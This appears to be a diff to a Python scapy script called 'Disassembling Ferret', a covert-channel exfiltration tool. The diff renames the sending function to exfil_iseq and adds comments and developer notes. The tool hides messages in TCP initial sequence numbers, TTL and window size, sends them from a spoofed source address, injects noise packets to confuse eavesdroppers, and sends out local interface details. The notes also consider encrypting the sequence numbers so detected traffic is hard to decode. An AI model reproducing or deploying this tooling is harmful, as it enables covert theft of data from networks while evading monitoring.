@@ -1,12 +1,14 @@
 #!/usr/bin/env python
 
 '''
+=======================================================================
   ___  _                  _    _ _             ___                _
  |   \(_)______ ___ _ __ | |__| (_)_ _  __ _  | __|__ _ _ _ _ ___| |_
  | |) | (_-<_-</ -_) '  \| '_ \ | | ' \/ _` | | _/ -_) '_| '_/ -_)  _|
  |___/|_/__/__/\___|_|_|_|_.__/_|_|_||_\__, | |_|\___|_| |_| \___|\__|
                                        |___/
 
+=======================================================================
 
 Send a message using TCP sequence numbers, ttl, window size, and perhaps
 others. Inject noise into the channel to confuse eavesdroppers.
@@ -30,6 +32,11 @@ Questions:
 - Why not bounce off DNS server(s) ?
 - Should we cipher the seq numbers we generate in order to add a layer of
   obfuscation? So if the traffic is detected it won't be easily translated.
+
+Notes:
+A testing suite should be able to perform all tests or individual tests.
+Lets start out by building the initial tests we are interested in and then run
+through them all. I'll add this info to the issue queue. - Clay
 
 '''
 
@@ -78,9 +85,6 @@ def exfil_ipid():
 	print '[*] Attempting ID identification exfil..'
 
 
-def exfil_iseq():
-	print '[*] Attempting initial sequence number exfil..'
-
 def exfil_bounce():
 	print '[*] Attempting Ack sequence number bounce exfil..'
 
@@ -110,7 +114,8 @@ def add_n0ise(i):
 	pkt.ttl = 128
 	send(pkt)
 
-def send_packet():
+# Send message using initial sequence numbers. Add noise.
+def exfil_iseq():
 	i = 0
 	k = 8192  # window size
 	for s in seq_array:
@@ -121,6 +126,8 @@ def send_packet():
 		send(pkt)
 		i += 1
 
+# This function sends interface details for interfaces of interest, AF_INET
+# family.
 def send_iface():
 	print '[*] interfaces: %s' % interfaces
 	# Interesting in sending found en*, eth*, and wlp* interface data
@@ -158,7 +165,8 @@ msglen = len(seq_array)
 # Future work: adjust some fields to perhaps better emulate commonly seen traffic.
 pkt = IP(src=spoof, dst=destination)/TCP(dport=37337, flags='S')
 
-send_packet()
+# Attempt data exfiltration using initial sequence numbers
+exfil_iseq()
 
 seq_array = []  # clear before each use
 
